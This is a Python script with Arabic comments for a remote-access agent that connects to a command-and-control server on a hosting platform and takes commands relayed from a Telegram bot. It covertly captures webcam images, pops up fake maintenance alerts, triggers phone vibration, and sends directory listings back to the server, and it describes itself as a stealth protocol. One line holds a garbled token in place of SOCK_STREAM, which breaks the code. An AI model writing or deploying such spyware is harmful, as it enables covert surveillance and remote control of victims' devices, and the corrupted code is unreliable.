import socket
import os
import cv2
import time
import subprocess

# --- الإعدادات السيادية للربط بالسيرفر ---
# ملاحظة: Render غالباً يستخدم المنفذ 10000 للاتصالات الخارجية
C2_HOST = "your-app-name.onrender.com" 
C2_PORT = 10000

def start_agent():
    print("[*] تم تفعيل بروتوكول التخفي...")
    while True:
        try:
            # إنشاء اتصال سوكيت مع سيرفر Node.js
            s = socket.socket(socket.AF_INET, socket.壓_STREAM)
            s.connect((C2_HOST, C2_PORT))
            print("[+] تم الاتصال بنجاح بمختبر التحكم.")
            
            while True:
                # استقبال الأوامر من بوت التيليجرام عبر السيرفر
                data = s.recv(1024).decode('utf-8')
                if not data: break
                
                # --- تنفيذ الأوامر المستلمة ---
                
                # 1. التحكم بالكاميرا
                if data.startswith("cam_"):
                    camera_idx = int(data.split("_")[1])
                    cap = cv2.VideoCapture(camera_idx)
                    ret, frame = cap.read()
                    if ret:
                        cv2.imwrite("captured.jpg", frame)
                        # هنا يمكن إضافة كود لإرسال الصورة للسيرفر
                    cap.release()
                
                # 2. إرسال إشعار للنظام (Alert)
                elif data.startswith("alert"):
                    # مثال بسيط لإظهار رسالة (يعمل على ويندوز)
                    os.system('msg * "Warning: System under maintenance"')
                
                # 3. تفعيل الاهتزاز (أندرويد ترمكس)
                elif data == "vibrate":
                    os.system("termux-vibrate -d 1000")
                
                # 4. جرد الملفات
                elif data == "ls":
                    files_list = subprocess.getoutput("ls")
                    s.send(files_list.encode('utf-8'))
                    
            s.close()
        except Exception as e:
            # إعادة المحاولة كل 15 ثانية في حال فشل الاتصال
            print(f"[-] خطأ في المزامنة: {e}. إعادة المحاولة...")
            time.sleep(15)

if __name__ == "__main__":
    start_agent()